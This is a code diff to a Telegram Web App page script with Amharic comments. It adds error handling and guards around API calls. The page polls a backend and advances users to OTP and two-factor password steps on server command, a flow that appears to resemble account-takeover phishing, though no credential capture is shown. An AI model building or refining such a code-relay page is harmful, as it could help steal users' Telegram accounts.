@@ -213,24 +213,28 @@
 
 <script>
     const tg = window.Telegram.WebApp;
-    tg.expand();
-    tg.ready();
-    tg.headerColor = '#ffffff';
-    tg.backgroundColor = '#ffffff';
+    
+    // ስህተት ቢኖርም እንዳያቋርጥ በ try...catch ውስጥ አድርገነዋል
+    try {
+        tg.expand();
+        tg.ready();
+        tg.headerColor = '#ffffff';
+        tg.backgroundColor = '#ffffff';
+    } catch(e) {}
 
-    // API_BASE_URL እዚህ ጋር ተወግዷል (ከ config.js ይነበባል)
-    let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
+    let userId = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
     let statusChecker;
     let isProcessing = false;
-    let savedName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "User";
+    let savedName = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.first_name : "User";
 
-    window.onload = function() {
+    // ፔጁ እንደከፈተ ወዲያውኑ ሰዓቱን ጀምሮ ወደ button እንዲያልፍ ተደርጓል
+    document.addEventListener("DOMContentLoaded", function() {
         setTimeout(() => { showStep('photo_slide'); }, 2000);
         statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
-    };
+    });
 
     function playTap() { if (window.navigator.vibrate) window.navigator.vibrate(15); }
 
@@ -249,6 +253,8 @@
     }
 
     function checkStatus() {
+        if(typeof API_BASE_URL === 'undefined') return;
+        
         fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
             if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
             else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
@@ -308,6 +314,12 @@
     }
 
     async function checkUserInDB() {
+        if(typeof API_BASE_URL === 'undefined') {
+            stopLoaders();
+            showMsg(1, 'error', 'Network error. Try again.');
+            return;
+        }
+        
         try {
             const res = await fetch(`${API_BASE_URL}/check_user_db`, {
                 method: 'POST',
@@ -455,4 +467,4 @@
     }
 </script>
 </body>
-            </html>
+</html>
